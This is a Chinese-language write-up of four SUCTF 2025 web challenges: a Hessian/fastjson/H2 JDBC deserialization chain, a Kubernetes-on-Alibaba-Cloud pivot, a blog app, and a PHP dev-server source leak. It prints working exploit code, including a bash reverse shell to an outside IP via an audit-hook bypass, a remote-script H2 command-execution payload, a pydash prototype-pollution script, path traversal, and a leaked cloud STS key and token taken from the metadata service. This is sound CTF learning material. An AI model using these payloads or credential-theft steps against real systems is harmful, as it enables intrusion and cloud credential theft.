+++
date = '2025-01-18T19:38:41+08:00'
draft = false
title = '2025-SUCTF-WP'
author='GSBP'
summary='2025年的第一场XCTF'
categories=["WP"]

+++


## SU_ez_solon

题目直接给了个hessian反序列化的接口

```
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.example.demo.controller;

import com.caucho.hessian.io.Hessian2Input;
import java.io.ByteArrayInputStream;
import java.util.Base64;
import org.noear.solon.annotation.Controller;
import org.noear.solon.annotation.Mapping;
import org.noear.solon.annotation.Param;

@Controller
public class IndexController {
    public IndexController() {
    }

    @Mapping("/hello")
    public String hello(@Param(defaultValue = "hello") String data) throws Exception {
        byte[] decode = Base64.getDecoder().decode(data);
        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode));
        Object object = hessian2Input.readObject();
        return object.toString();
    }
}

```

不过他这个反序列化还给了一个toString()的调用

然后再观察一下给的依赖

```
...
 <dependency>
            <groupId>com.alipay.sofa</groupId>
            <artifactId>hessian</artifactId>
            <version>3.5.5</version>
        </dependency>
        <dependency>
            <groupId>com.alipay.sofa.common</groupId>
            <artifactId>sofa-common-tools</artifactId>
            <version>1.4.0</version>
        </dependency>


        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.83</version>
        </dependency>

        <dependency>
            <groupId>com.h2database</groupId>
            <artifactId>h2</artifactId>
            <version>2.2.224</version>
        </dependency>
```

h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击

### 做题过程

做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了

我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法

`org.h2.jdbc.JdbcConnection.JdbcConnection()`

就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类

这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法

- org.h2.jdbcx.JdbcDataSource.getConnection()
- org.noear.solon.data.util.UnpooledDataSource

第一个被黑名单ban了，但是它给了我们些许灵感，`JdbcDataSource`类实现了`DataSource`接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法

所以我们找到了`UnpooledDataSource`方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思

```
public UnpooledDataSource(String url, String username, String password, String driverClassName) {
        if (Utils.isEmpty(url)) {
            throw new IllegalArgumentException("Invalid ds url parameter");
        } else {
            this.logWriter = new PrintWriter(System.out);
            this.url = url;
            this.username = username;
            this.password = password;
            this.setDriverClassName(driverClassName);
        }
    }
    
public Connection getConnection() throws SQLException {
        return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password);
    }
```

构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强



然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用`setSecurityManager(null)`就好了

```
    public static void main(String[] args) throws Exception{
        UnpooledDataSource unpooledDataSource = new UnpooledDataSource("jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'","GSBP","GSBP","org.h2.Driver");
        unpooledDataSource.setLogWriter(null);
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("xx", unpooledDataSource);


        String payload =Util.hessianSerialize(jsonObject);
        System.out.println(URLEncoder.encode(payload, "UTF-8"));
        Util.hessianDeserialize(payload);

    }
```

poc.sql

```
  CREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;CALL GSBPPP12('command what you want execute');
```

## SU_easyk8s_on_aliyun(REALLY VERY EASY)

确实是很简单的一个云渗透

前面要从python那里拿个shell，不过有hook

```
import sys

DBUG = False

def audit_hook(event, args):
    audit_functions = {
        "os.system": {"ban": True},
        "subprocess.Popen": {"ban": True},
        "subprocess.run": {"ban": True},
        "subprocess.call": {"ban": True},
        "subprocess.check_call": {"ban": True},
        "subprocess.check_output": {"ban": True},
        "_posixsubprocess.fork_exec": {"ban": True},
        "os.spawn": {"ban": True},
        "os.spawnlp": {"ban": True},
        "os.spawnv": {"ban": True},
        "os.spawnve": {"ban": True},
        "os.exec": {"ban": True},
        "os.execve": {"ban": True},
        "os.execvp": {"ban": True},
        "os.execvpe": {"ban": True},
        "os.fork": {"ban": True},
        "shutil.run": {"ban": True},
        "ctypes.dlsym": {"ban": True},
        "ctypes.dlopen": {"ban": True}
    }
    if event in audit_functions:
        if DEBUG:
            print(f"[DEBUG] found event {event}")
        policy = audit_functions[event]
        if policy["ban"]:
            strr = f"AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}"
            print(strr)
            raise PermissionError(f"[AUDIT BANNED]{event} is not allowed.")
        else:
            strr = f"[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}"
            print(strr)
            return

sys.addaudithook(audit_hook)
```

这里`_posixsubprocess.fork_exec`这个hook是抓不了的，所以它等于白写

```
__import__('_posixsubprocess').fork_exec(
    [b"/bin/bash", b"-c", b"bash -i >& /dev/tcp/1.1.1.1/6666 0>&1"], 
    [b"/bin/bash"], 
    True, (), None, None, 
    -1, -1, -1, -1, -1, -1, 
    *(__import__('os').pipe()), 
    False, False, False, 
    None, None, None, 
    -1, None, False
)
```

直接拿shell，然后用pty升级一下自己的shell

进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64

```
...
[  Information Gathering - Net Namespace  ]
        container net namespace isolated.

[  Information Gathering - Sysctl Variables  ]
2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1
2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes.

[  Information Gathering - DNS-Based Service Discovery  ]
error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host
error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host

[  Discovery - K8s API Server  ]
2025/01/12 08:57:58 checking if api-server allows system:anonymous request.
err found in post request, error response code: 401 Unauthorized.
        api-server forbids anonymous request.
        response:{"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}


[  Discovery - K8s Service Account  ]
        service-account is available
2025/01/12 08:57:58 trying to list namespaces
err found in post request, error response code: 403 Forbidden.

[  Discovery - Cloud Provider Metadata API  ]
        Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/
        Docs: https://help.aliyun.com/knowledge_detail/49122.html
2025/01/12 08:57:59 failed to dial Azure API.
2025/01/12 08:57:59 failed to dial Google Cloud API.
2025/01/12 08:57:59 failed to dial Tencent Cloud API.
2025/01/12 08:58:00 failed to dial OpenStack API.
2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API.
2025/01/12 08:58:02 failed to dial ucloud API.

...
```

与题目名字相结合，知道了关键信息

```
[  Discovery - Cloud Provider Metadata API  ]
        Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/
        Docs: https://help.aliyun.com/knowledge_detail/49122.html
```

然后去看文档

![image-20250119001027524](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119001027524.png)

很明显在题目内是没有开加固模式的,我们这里直接访问就好

然后拿到了一个ak/sk

```
 {
  "AccessKeyId" : "STS.NTfZuo3n761cQMys2MNiNBo9a",
  "AccessKeySecret" : "5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY",
  "Expiration" : "2025-01-12T14:05:03Z",
  "SecurityToken" : "CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==",
  "LastUpdated" : "2025-01-12T08:05:03Z",
  "Code" : "Success"
}
```

很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了

![image-20250119001224588](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119001224588.png)

## SU_blog

注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了

也省了后面爆破jwt密钥的操作

看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越

![image-20250119001454706](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119001454706.png)

发现加`../`和不加是一样的，猜测后端进行了replace操作

所以试一下双写`..../`，然后就能读了

读到源码和waf(waf我这里用waf.../py来绕过读到)

```
from flask import *
import time, os, json, hashlib
from pydash import set_
from waf import pwaf, cwaf

app = Flask(__name__)
app.config['SECRET_KEY'] = hashlib.md5(str(int(time.time())).encode()).hexdigest()

users = {"testuser": "password"}
BASE_DIR = '/var/www/html/myblog/app'
articles = {
    1: "articles/article1.txt",
    2: "articles/article2.txt",
    3: "articles/article3.txt"
}
friend_links = [
    {"name": "bkf1sh", "url": "https://ctf.org.cn/"},
    {"name": "fushuling", "url": "https://fushuling.com/"},
    {"name": "yulate", "url": "https://www.yulate.com/"},
    {"name": "zimablue", "url": "https://www.zimablue.life/"},
    {"name": "baozongwi", "url": "https://baozongwi.xyz/"}
]

class User:
    def __init__(self):
        pass

user_data = User()

@app.route('/')
def index():
    if 'username' in session:
        return render_template('blog.html', articles=articles, friend_links=friend_links)
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in users and users[username] == password:
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials", 403
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        users[username] = password
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/change_password', methods=['GET', 'POST'])
def change_password():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        old_password = request.form['old_password']
        new_password = request.form['new_password']
        confirm_password = request.form['confirm_password']
        
        if users[session['username']] != old_password:
            flash("Old password is incorrect", "error")
        elif new_password != confirm_password:
            flash("New passwords do not match", "error")
        else:
            users[session['username']] = new_password
            flash("Password changed successfully", "success")
        return redirect(url_for('index'))
    return render_template('change_password.html')

@app.route('/friendlinks')
def friendlinks():
    if 'username' not in session or session['username'] != 'admin':
        return redirect(url_for('login'))
    return render_template('friendlinks.html', links=friend_links)

@app.route('/add_friendlink', methods=['POST'])
def add_friendlink():
    if 'username' not in session or session['username'] != 'admin':
        return redirect(url_for('login'))
    
    name = request.form.get('name')
    url = request.form.get('url')
    if name and url:
        friend_links.append({"name": name, "url": url})
    return redirect(url_for('friendlinks'))

@app.route('/delete_friendlink/')
def delete_friendlink(index):
    if 'username' not in session or session['username'] != 'admin':
        return redirect(url_for('login'))
    
    if 0 <= index < len(friend_links):
        del friend_links[index]
    return redirect(url_for('friendlinks'))

@app.route('/article')
def article():
    if 'username' not in session:
        return redirect(url_for('login'))
    
    file_name = request.args.get('file', '')
    if not file_name:
        return render_template('article.html', file_name='', content="未提供文件名。")
    
    blacklist = ["waf.py"]
    if any(blacklisted_file in file_name for blacklisted_file in blacklist):
        return render_template('article.html', file_name=file_name, content="大黑阔不许看")
    
    if not file_name.startswith('articles/'):
        return render_template('article.html', file_name=file_name, content="无效的文件路径。")
    
    if file_name not in articles.values():
        if session.get('username') != 'admin':
            return render_template('article.html', file_name=file_name, content="无权访问该文件。")
    
    file_path = os.path.join(BASE_DIR, file_name)
    file_path = file_path.replace('../', '')
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
    except FileNotFoundError:
        content = "文件未找到。"
    except Exception as e:
        app.logger.error(f"Error reading file {file_path}: {e}")
        content = "读取文件时发生错误。"
    
    return render_template('article.html', file_name=file_name, content=content)

@app.route('/Admin', methods=['GET', 'POST'])
def admin():
    if request.args.get('pass') != "SUers":
        return "nonono"
    
    if request.method == 'POST':
        try:
            body = request.json
            if not body:
                flash("No JSON data received", "error")
                return jsonify({"message": "No JSON data received"}), 400
            
            key = body.get('key')
            value = body.get('value')
            
            if key is None or value is None:
                flash("Missing required keys: 'key' or 'value'", "error")
                return jsonify({"message": "Missing required keys: 'key' or 'value'"}), 400
            
            if not pwaf(key):
                flash("Invalid key format", "error")
                return jsonify({"message": "Invalid key format"}), 400
            
            if not cwaf(value):
                flash("Invalid value format", "error")
                return jsonify({"message": "Invalid value format"}), 400
            
            set_(user_data, key, value)
            flash("User data updated successfully", "success")
            return jsonify({"message": "User data updated successfully"}), 200
        
        except json.JSONDecodeError:
            flash("Invalid JSON data", "error")
            return jsonify({"message": "Invalid JSON data"}), 400
        except Exception as e:
            flash(f"An error occurred: {str(e)}", "error")
            return jsonify({"message": f"An error occurred: {str(e)}"}), 500
    
    return render_template('admin.html', user_data=user_data)

@app.route('/logout')
def logout():
    session.pop('username', None)
    flash("You have been logged out.", "info")
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)

```

除了之前用到的接口，只剩下一个`/Admin`

这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染

https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/

waf里数字只剩下2，也是指引我们打jinja2

我们还需要获取sys模块，上面文章链接中的一个payload是用了`__loader__`，但是这题被ban了

那我们只能用`__spec__`来代替`__loader__`来获取到sys模块

因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通

exp

```
import requests
import multiprocessing
js = {
    "key": "__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2",
    "value": "*;import os;os.system('/read\\x66lag > /tmp/f')"}

def brute(url):
    while True:
        try:
            res = requests.post(url + "/Admin?pass=SUers", json=js)
            print(url + ":" + res.text)
            requests.get(url + "/Admin?pass=SUers")
            requests.get(url + "/")
            requests.get(url + "/login")
            requests.get(url + "/register")
        except Exception as e:
            print(e)

if __name__ == '__main__':
    urls=["http://27.25.151.48:10000",
         "http://27.25.151.48:10001",
         "http://27.25.151.48:10002",
         "http://27.25.151.48:10003",
         "http://27.25.151.48:10004",
         "http://27.25.151.48:10005"]
    for url in urls:
        p = multiprocessing.Process(target=brute, args=(url,))
        p.start()
```

## SU_photogallery

由404页面可以很明显的知道是一个临时服务`php -S`开启的

再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码

https://cloud.tencent.com/developer/article/2235691

所以这里也是有模学样的拿到源码

![image-20250119002351188](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119002351188.png)

后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)

![image-20250119002449472](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119002449472.png)
